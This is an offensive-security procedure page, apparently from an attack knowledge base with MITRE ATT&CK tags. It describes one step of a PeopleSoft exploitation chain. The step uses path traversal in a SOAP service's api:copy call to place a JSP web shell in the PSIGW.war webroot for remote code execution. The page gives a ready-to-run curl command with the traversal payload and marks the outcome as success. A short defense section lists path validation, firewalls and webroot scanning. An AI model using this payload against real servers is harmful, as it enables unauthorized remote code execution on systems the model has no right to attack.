---
tags:
  - file-upload
  - path-traversal
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-post-xxe-test]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:24:07.969Z'
sub_techniques: []
id: d67cc920-02fd-409c-89a3-ef869970b4e6
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Copy-JSP-to-Webroot

## Summary

This procedure copies the injected JSP shell from the temp directory to the web-accessible PSIGW.war directory using path traversal in the api:copy method.

## Description

Use the service to move the modified XML (now containing JSP) to ./applications/peoplesoft/PSIGW.war/PVrIiSDNAQlOQubhYHDE.jsp, making it directly accessible via HTTP for RCE.

## Requirements

1. JSP-injected file in temp dir
2. Write access to PSIGW.war
3. Service endpoint active

## Defense

Defensive measures and detection strategies:

- Enforce strict path validation in file operations
- Deploy web application firewalls to block traversal patterns
- Regularly scan webroots for unauthorized files

## Objectives

1. Deploy shell to executable location
2. Make RCE accessible externally
3. Complete the exploitation chain

## Instructions

### Step 1: Perform Webroot Copy

**Context**: Copy using traversal paths to target JSP filename.

**Command** ([[commands/curl-post-xxe-test]]):
```bash
curl -k -X POST -H "Content-Type: text/xml" https://target/pspc/services/lmJyaVBUrfcEfJw -d '<soap:Envelope...><api:copy from="../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml" to="./applications/peoplesoft/PSIGW.war/PVrIiSDNAQlOQubhYHDE.jsp"/></soap:Envelope>'
```

> Success: JSP file in webroot, accessible via GET.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-xxe-test]]

## Tools Used

- [[tools/curl]]

## Tags

- [[file-upload]]
- [[path-traversal]]
